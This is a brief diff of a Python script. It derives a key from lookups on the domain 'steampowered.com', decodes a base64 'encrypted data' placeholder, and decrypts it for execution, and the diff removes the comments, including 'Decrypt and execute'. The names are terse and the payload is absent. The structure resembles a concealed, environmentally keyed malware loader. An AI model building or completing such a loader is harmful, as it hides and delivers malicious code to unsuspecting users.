@@ -44,12 +44,10 @@ if __name__ == "__main__":
     d = "steampowered.com" 
     ed_b64 = "Your_Base64_Encoded_Encrypted_Data_Here"  # Placeholder
 
-    # Process
     rs = ftr(d)
     mr = om(rs)
     fh = ho(mr)
 
-    # Decrypt and execute
     ed = base64.b64decode(ed_b64)
     dc = dd(ed, fh)
     
